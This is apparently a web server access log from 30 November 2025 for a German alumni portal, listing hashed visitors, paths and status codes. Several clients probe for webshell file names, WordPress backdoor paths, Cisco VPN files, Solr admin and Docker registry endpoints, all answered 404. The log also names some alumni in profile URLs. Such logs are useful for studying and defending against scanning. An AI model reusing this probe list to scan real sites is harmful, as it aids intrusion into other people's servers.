user;timestamp;referer;target;method;status
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:02;;/autoload_classmap.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:02;;/asd67.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:02;;/12.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:03;;/manager.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:03;;/usep.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:03;;/auth.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:03;;/wp-content/packed.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:04;;/hello.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:04;;/abt.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:04;;/jmfi2.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:05;;/layout.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:05;;/up.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:05;;/flower.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:06;;/nope.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:06;;/js.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:06;;/wp-content/upgrade/index.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:07;;/media.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:07;;/update/f35.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:07;;/default.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:07;;/wp-content/uploads/wp-conflg.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:08;;/wp-load.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:08;;/f35.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:08;;/sko.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:09;;/new.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:09;;/wp-mail.php/wp-includes/ID3/rnEPv9.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:09;;/png.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:09;;/log.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:10;;/zwso.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:10;;/about3.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:10;;/fm.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:11;;/r4f_1.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:11;;/ftp.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:11;;/content.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:11;;/ext.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:12;;/himu.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:12;;/wfile.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:12;;/pp.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:13;;/miansha.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:13;;/test2.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:13;;/wp-admin/maint/index.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:13;;/wp-links-opml.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:14;;/mah.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:14;;/wp-includes/IXR/about.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:14;;/build.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:15;;/atomlib.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:15;;/lib.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:15;;/lv.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:15;;/class-wp.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:16;;/about.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:16;;/filemanager.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:16;;/mail.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:17;;/CLA.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:17;;/ol.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:17;;/ouh.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:17;;/tgrs.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:18;;/system_log.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:18;;/gifclass4.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:18;;/z.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 18:07:19;;/akcc.php;GET;404
26f3e27d42de7cb0b3c11e72ea3e610d49b98448e1187ae5b48c4be73e26f722;2025-11-30 18:08:45;;/personen/alumni/schule/5506;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-30 18:15:14;/gruppen/hobby/sozialwissenschaften;/gruppen/hobby/fitness;GET;302
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-30 18:15:15;/gruppen/hobby/sozialwissenschaften;/gruppen;GET;200
815eb02900a710e93336396f6a5fb9f75f18e2f4789d31b273f066247cb91205;2025-11-30 18:21:12;;/+CSCOL+/Java.jar;GET;404
815eb02900a710e93336396f6a5fb9f75f18e2f4789d31b273f066247cb91205;2025-11-30 18:21:13;;/+CSCOE+/logon_forms.js;GET;404
815eb02900a710e93336396f6a5fb9f75f18e2f4789d31b273f066247cb91205;2025-11-30 18:21:14;;/+CSCOL+/a1.jar;GET;404
815eb02900a710e93336396f6a5fb9f75f18e2f4789d31b273f066247cb91205;2025-11-30 18:21:15;;/+CSCOE+/transfer.js;GET;404
0410cc5726850d06e131fd54d0f61d2541468c5b204931badfb734151757bb74;2025-11-30 18:24:30;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
2e313dbd58bdf92d16968763adc4c3923f6ada7bfd9e6cbd95a0a83d63da9307;2025-11-30 18:31:50;;/register;GET;200
4c63f8437b52c810529a683b640a23457c4a1e23a07b33b830decc8fb8fdd7c4;2025-11-30 18:31:56;;/gruppen/interesse/it-und-softwareentwicklung;GET;200
26afabeeae3ebace5198569af6d473d32930156a491ede77f4802b087a28dcc6;2025-11-30 18:31:58;;/gruppen/hobby/grafikdesign;GET;302
f06747f4841b94fc1298a824ce928770dce1d350d8ccb8ea7f7655a6fcd61881;2025-11-30 18:32:03;;/gruppen/interesse/datenanalyse-und-forschung;GET;200
616297cef945b63d5cbeb6f10e14c1db568aae56c4f58906be539a1758dc055d;2025-11-30 18:32:08;;/gruppen/hobby/nahen-und-textilarbeiten;GET;302
a091388303b495ef1b7fcd0f5373ddaf85ee47173c161d3d3dcdba86b9855298;2025-11-30 18:35:45;;/personen/alumni/schule/190627;GET;200
512f29edf16f6be7febe2a2e14a32f291b21f4325cc0aa3986dcff60210bf817;2025-11-30 18:39:54;;/?page=docs-DT1-dea.md;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-30 18:50:51;;/register;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-30 18:52:19;;/personen/alumni/schule/0351;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-30 18:52:48;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-30 18:53:38;;/login;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-30 18:55:02;;/;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-30 18:56:26;/rechtliches/impressum;/personen/alumni/schule/4440012;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-30 18:57:49;/gruppen/hobby/sozialwissenschaften;/gruppen/hobby/nahen-und-textilarbeiten;GET;302
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-30 18:57:50;/gruppen/hobby/sozialwissenschaften;/gruppen;GET;200
b8f065d6a1b988578014c5a42b1f2da902493bb32f6cc9c77ee6631a179e63a6;2025-11-30 19:00:42;;/personen/alumni/schule/HS001;GET;200
163fc7d30b42abc08e91b21b7c03e5c98ec32013f24e4eddacf46a89b461d206;2025-11-30 19:00:45;/;/;GET;200
6c7cbda7ee584685f46b25f260010a044c89b8c16ecc4ba5535c50b6839a0e11;2025-11-30 19:01:50;;/?page=docs-sql;GET;200
2e7d0ddd92076f9abbf876329c559a83a633f5560985ca523e3fc14da84c34fd;2025-11-30 19:04:59;;/gruppen/hobby/malen-und-zeichnen;GET;302
b15fbb64b054b9099bc39d303e15731a3e8b928dd20afab2e72fa6b9d8bacabc;2025-11-30 19:10:08;;/sitemap.xml.gz;GET;404
66404f0ed01f304b2c41d402c392067adf0c1f9a83e76a8e63f0a6ccbb664c58;2025-11-30 19:14:00;;/;GET;200
77c2217b2e824cfc4ebe16a5fb7388a3141c003879c7cac5b8211e2391ce2f18;2025-11-30 19:22:39;;/sitemaps.xml;GET;404
8dce3f89b9dde903842230c16f9b919774db5ea134069a3c5a13087e3ae18bb0;2025-11-30 19:24:55;;/personen/alumni/details/sebastian-langhorst;GET;200
3246c423bd6d7936d6d5e7d9ed8986a4dce0de6996266a560c97e63bd71bcf65;2025-11-30 19:28:20;;/;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-30 19:30:18;;/themen?category=community;GET;200
1ecebaa064225a98d18a4b74d7ef480ec487f09fbbc7ea4314c1278434dee5e6;2025-11-30 19:32:08;;/;GET;200
c8b26615367b9db5c4a64433b1e613f9a81978357d773fa3c46c4918d2c69fad;2025-11-30 19:33:13;;/version;GET;404
7be5d25c8af3c380fbd82e54ecbdfe74388c88456d0426bbd28bff135161a718;2025-11-30 19:34:25;;/gruppen/interesse/projektmanagement;GET;200
42ee4eef99197835e929d171f8d8b16ce9505340799e98ce0b5016db5e6e9a68;2025-11-30 19:34:31;;/veranstaltungen/details/wohnzimmerkonzert;GET;200
50c18a9f435930cbdc37d64aaaa31b6029336e2d27b3feb52eda8a2d85748c02;2025-11-30 19:34:35;;/gruppen/hobby/wandern;GET;302
0fb3bac21a01e9c24a5867b99c794e913420814a7b9a8dd34f1eb93591592a5a;2025-11-30 19:34:38;;/gruppen/hobby/politik-und-debatten;GET;302
6c1a04387e5b1740c0d6aa76bb5be5846621969601cbb7dada6efe9ab19fa12e;2025-11-30 19:34:42;;/gruppen/hobby/fotobearbeitung;GET;302
14b3e81c19e4937409eb97e35ba22e57e5e62c0656bd5454a511ae8a40487d70;2025-11-30 19:34:48;;/gruppen/hobby/logikspiele;GET;302
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-30 19:40:25;/rechtliches/impressum;/personen/alumni/schule/HB0002;GET;200
7da453e68efe251173b0b8303c27ab85823437a019f2459f8b45562653f02419;2025-11-30 19:50:36;;/personen/alumni/schule/MP002;GET;200
4ab332072e83bfa3f959a6b690174f64f7d0f96bda5a8052f17d35f824a0fc83;2025-11-30 19:50:43;;/;GET;200
ce07a43b2c98fab178e9ab30b9a68553c29bab3ec97f299ddc7330ada66b71ef;2025-11-30 19:53:11;;/;GET;200
452393d7388d236bde7cff5f740ebed42c451dc859c93c366c8878a1e44326b7;2025-11-30 19:59:41;;/;GET;200
bd196807870bc00a219cf701c667fae5753a98044d1251606e2cfe2786cdbffa;2025-11-30 19:59:52;/;/;GET;200
a89e2f0fb254a1e211068455c51b467d366029527566ffc9113e50f91a75ded0;2025-11-30 19:59:57;/sitemap.xml;/sitemap.xml;GET;200
e5a2e6179f6905648d622b0f3b22b0dec0d87de3444243087b10f1835df5bde2;2025-11-30 20:00:10;;/;GET;200
d4903c41d93c8fb8ea3b71feb2858da18430b8137054541a5630568055fc3957;2025-11-30 20:01:51;;/;GET;200
0585f502917a48f87e9bf1c303c90e07a81e0619d21dce80adbb054fa19f4c7b;2025-11-30 20:01:59;;/themen?category=bildung;GET;200
74283de2d399279a6f4574797e1f2a1c9374e41f1b303c21900fcc8bebab1b27;2025-11-30 20:04:48;;/gruppen/hobby/gesang;GET;302
ee41901b63d9113a1a41c29dd204a8c9a5c7c77fd336f2e87e3cff42aab40579;2025-11-30 20:07:48;;/personen/alumni/details/sophia-gawron;GET;200
251adbb0328fc897135d4e7b7f8908e3334d3a986dd858cbe912e1abd4fcb07a;2025-11-30 20:10:25;;/sitemap.xml.gz;GET;404
80eb04bca6216006524b8e53fd4c2d3e35841efe7d0e5271eb5e7113a3915af2;2025-11-30 20:19:23;;/personen/alumni/schule/190627;GET;200
02f66c2824c035276f5b33530aa39c435780e9f9a2564dcc2497ff94c98cb850;2025-11-30 20:22:04;;/sitemaps.xml;GET;404
d987f949674320506cec88f7d6e9294cbe6c8c7c882818e565686489196c41ad;2025-11-30 20:26:16;;/gruppen/hobby/reisen;GET;302
9edf0401f9e190c45ce02e5d2586038bffb402e136bf11d3470b73f4334bac27;2025-11-30 20:26:23;;/gruppen/hobby/podcasting;GET;302
b8ce1ea312f2907f8b084b63b05a49a7fabfb25119bae8dd8e10a1afaed85104;2025-11-30 20:26:25;;/gruppen/hobby/musikinstrumente-spielen;GET;302
4b04d2804909c50f8985819478782a501c4c3f8bcc74dca064c7d900edb40498;2025-11-30 20:26:29;;/gruppen/hobby/fitness;GET;302
314633f325431f5c1d3119c85b187622e70cbeef8978d53441fc47738a8b089d;2025-11-30 20:45:16;;/personen/alumni/details/benjamin-voigt;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-30 20:54:10;/rechtliches/impressum;/personen/alumni/schule/5506;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-30 20:55:32;/rechtliches/impressum;/personen/alumni/schule/4540118;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-30 20:56:59;/gruppen/interesse/datenanalyse-und-forschung;/personen/alumni/details/asja-apelt-genannt-henze;GET;200
9a95a861af3e9c56dbd8dcfd9c6dea349a7698990c51af41efd7ecea72549289;2025-11-30 20:57:51;;/gruppen/hobby/robotik;GET;302
5a8de6356486735be1c751c9df72736a820cbed62a95e6123ef2aa7b0a6f1d83;2025-11-30 20:57:55;;/reset-password;GET;200
baefb152f26544e034ada709f53518e4d9f7b7ab9e32668878ab9f6aa2e1f7fa;2025-11-30 21:02:12;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
b8b618d9f1255b9c1382fddad19aed2be31ae3dd53c3bc54643005aa396d53bd;2025-11-30 21:02:55;/personen;/personen;GET;200
8362d567d1c598eaad9394b6e1174b2038550859b8829575e1a4eb638a537b52;2025-11-30 21:12:00;;/personen/all/5;GET;200
f8f65004fc802187dd1292f369053c2111947a25aec870bfc072210f17bc28b8;2025-11-30 21:12:57;;/;GET;200
6de3d7fb06637e0647d04dfe97b9d3a9de2aff2a739ae1b639fb8f1f0366cc7d;2025-11-30 21:30:03;;/;GET;200
b6ec75bbb2858e5c9765836955f136fecedef6d40c7155340bd47636e77c36b9;2025-11-30 21:33:26;;/gruppen/interesse/gesundheitswesen-und-pflege;GET;200
bbdced1c2032d061c920aa5d349fadc41a17ade0dbc74892411800c3e813ce3e;2025-11-30 21:37:45;;/;GET;200
46b339cbf07f2a5dad6e9969dfde8139666f1f96a479ab8eb1127397827d3b01;2025-11-30 21:41:16;;/personen/alumni/schule/67210;GET;200
b90e1139bb433880b742bb20819f9d2ea1d383cb7dd7c8cf7b8d1c0ab8bac9e0;2025-11-30 21:42:44;;/;GET;200
3981380650039863cfd1cad6a152f875554acb0f38e5a63f4be1b9e49980c48b;2025-11-30 21:48:49;;/;GET;200
577a25e4f90912724db771977e15012d0e78bba83402cbd61afd39cdc114f58f;2025-11-30 21:49:54;/aktuelles/stellenangebote;/aktuelles/stellenangebote;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-30 21:54:25;/rechtliches/impressum;/personen/alumni/schule/03A04;GET;200
5ff17b5f5019ed6efc06cfb9172a1a1d7c2fb6be47c7c63d842e98293f718ccb;2025-11-30 22:03:33;;/gruppen/hobby/ernahrungswissenschaft;GET;302
4e26edad5fc5c454eba3e8e475bb01112c5a10f1ef968bb62256eb2133dc33e2;2025-11-30 22:12:36;;/;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-30 22:15:50;/gruppen/hobby/sozialwissenschaften;/gruppen/hobby/statistik;GET;302
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-30 22:15:53;/gruppen/hobby/sozialwissenschaften;/gruppen;GET;200
963acf2fcb295b16fc6a97ce3f003d37a81fb72f75354ec8b9320d101bdc12ba;2025-11-30 22:24:30;;/personen/alumni/schule/190627;GET;200
5ce725f9a0dfb3924606587e19a1710ccf236c3011cc24876bf79f62ed03ef7c;2025-11-30 22:26:55;;/gruppen/hobby/sozialwissenschaften;GET;302
786bb84a8753c75134549fdcdd43024f239b7ebd271a99742b9d65b21923d984;2025-11-30 22:26:57;;/gruppen/hobby/schreinern-und-bauen;GET;302
ef80058657c224944578081d67bd4aa6361f12413f2924a641f06c82387e49b2;2025-11-30 22:27:01;;/gruppen/hobby/biologie;GET;302
512f29edf16f6be7febe2a2e14a32f291b21f4325cc0aa3986dcff60210bf817;2025-11-30 22:27:10;;/personen/alumni/details/tobi-esche;GET;200
edbc5187ea9e1b4f340ca05a2b6cc100bcdd16258a1c6eb84d55d894d14c44b1;2025-11-30 22:28:17;;/;GET;200
991fc555599b1655263a4b24589738462d4ab06819ba0f736082baac96c66f65;2025-11-30 22:37:43;;/themen/details/abschied-aus-moabit;GET;200
b5712c168a77aa8ade1084237e92fe295197838ec3a60be75e5b326e8f900158;2025-11-30 22:49:37;;/personen/alumni/schule/MP002;GET;200
304970c76600f6feb29f7d04063431387af3c187fecfa621aa74e697e4f1c364;2025-11-30 22:52:17;/solr/admin/info/system;/solr/admin/info/system;GET;404
304970c76600f6feb29f7d04063431387af3c187fecfa621aa74e697e4f1c364;2025-11-30 22:52:17;/v2/_catalog;/v2/_catalog;GET;404
f9d095ed36aadb4074944e0103a89bbad3836963a2d97303dbd332130cd66a84;2025-11-30 22:52:17;/query?q=SHOW+DIAGNOSTICS;/query?q=SHOW+DIAGNOSTICS;GET;404
dab6a0ee09a073b8cf90bb7120ed3c337246662b43cd6a59587b10086ae413e8;2025-11-30 22:52:17;;/;GET;200
304970c76600f6feb29f7d04063431387af3c187fecfa621aa74e697e4f1c364;2025-11-30 22:52:18;/solr/admin/cores?action=STATUS&wt=json;/solr/admin/cores?action=STATUS&wt=json;GET;404
352fda8d12a0dfcd8fd8fc8ecd2b96e1984c3bcb8aebe9e64c66f66b21f04bfb;2025-11-30 22:52:19;/;/;GET;200
8a59164c909b78b9435863a66d7b5831634c371e56f5440e50edc07807031611;2025-11-30 22:53:21;;/gruppen/hobby/geschichte;GET;302
8f396eeda72715f30d5e26e0f497cd87ebdebb9a81593fde815467ed7d0ad014;2025-11-30 22:53:28;;/gruppen/hobby/tanzen;GET;302
5a8de6356486735be1c751c9df72736a820cbed62a95e6123ef2aa7b0a6f1d83;2025-11-30 22:53:30;;/gruppen/hobby/teamsportarten;GET;302
ca42ea59265ff463d9f9325f1716bdd0154475634fb7f90202cbe9cee2bcb082;2025-11-30 22:53:33;;/gruppen/hobby/kochen-und-backen;GET;302
55f56538fd025bdc8f9dff62640c6151eab5299bbd2ad6b6aa6272aa1194e864;2025-11-30 22:53:38;;/personen/alumni/details/felix-fischer;GET;200
cd71a1380806ee11dcd339e04143df0a11b7f83c1316873894446ffe903538d8;2025-11-30 22:53:39;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
7a9312b0d6adf89c81cd068e32139ada047406a634abdac3b123aa07328af76c;2025-11-30 22:53:41;;/personen/alumni/details/thomas-matzig;GET;200
9e52b3fa69271d48be58f9363babc6199cbebd2aaed3297ebfee5e2f81dcdc21;2025-11-30 22:55:55;;/;GET;200
bb50cac1315ddf1df06824a8faca5a5892ec51e7bbc5a8495f7c76d54b94a07f;2025-11-30 23:02:51;;/;GET;200
fff78639dc4db5ae5a7b469a0e0f4f53425d67c4eeeb4473b78b3c2d419aff32;2025-11-30 23:03:22;;/;GET;200
c5c142c51853fc78d1b01520715d8d5d22d9efc5314373c6a8e83741ed19931c;2025-11-30 23:07:52;;/;GET;200
84bd61a4990e9fafb6acc5057c18fa3b2c22b85c9b21e6479d7f1a6ad8d0b1c4;2025-11-30 23:15:03;;/;GET;200
6044247ac9a307d0d615ee9af4aac258f38066d9b95a4e5b169f0a80806b2f18;2025-11-30 23:20:25;;/;GET;200
9e763aee7acf71c35d7be213d4de70134535c250ecdf99f33052c2f91000ee72;2025-11-30 23:29:48;;/gruppen/hobby/debattieren;GET;302
e1dd635c30610fa5905e1153a75acc40a86a2c659a55b17dea04c4b56687cea1;2025-11-30 23:29:54;;/gruppen/hobby/lesen;GET;302
39139bde2532f42bebaa101047053401f4aa3f5af203a6a5c1f82161889eea1d;2025-11-30 23:31:44;;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
0bb89a116102425b681bb172687e3335df88b1b6ceffb245144bc45921e52bfc;2025-11-30 23:37:25;;/;GET;200
d4814bc2ecc9fdb6157a2a10861ec898893a958eea6b439348179465593c82d6;2025-11-30 23:41:56;;/personen/alumni/details/sebastian-langhorst;GET;200
11fbed86c1788e4e479ca15cac071ff7d85c844bf212c217de49c3e4bc915f48;2025-11-30 23:43:40;;/themen/details/der-start-ins-studium;GET;200
3d1702aa8055d0944d37590aefefa6956e3726d29b037b74ef770d2255e4a300;2025-11-30 23:46:08;;/;GET;200
2bf5afc507fbfa9ff455752c9a0986d9693784470194ef54fc5a9391e3538268;2025-11-30 23:46:26;;/;GET;200
9724c10abd4067aae09e9709fa577ef4f77c86fef6202b3b4ac706f668b31ab7;2025-11-30 23:50:14;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
c04408f34a06a975b02ee212bc3d34537df678d11a1a60fad830921024f98bc7;2025-11-30 23:54:57;/;/;GET;200
f624b6a1c0c53fb6d500ea4abe271104bcdd0c697bf0e5730b73ac44a0e8e384;2025-11-30 23:59:33;;/personen/all/2;GET;200
fc35ef93448f21ea1536a5c42f35c4c9fc6227b2d48dba1173b90c5df464eab5;2025-11-30 23:59:38;;/personen/all/4;GET;200
e1dd635c30610fa5905e1153a75acc40a86a2c659a55b17dea04c4b56687cea1;2025-11-30 23:59:41;;/gruppen/hobby/musikproduktion;GET;302
c4ea4054849d4d94bbe4c2d254ef90cc1ba53b6d787fcb6b5bcb50d4050dcd33;2025-11-30 23:59:46;;/personen/alumni/details/asja-apelt-genannt-henze;GET;200
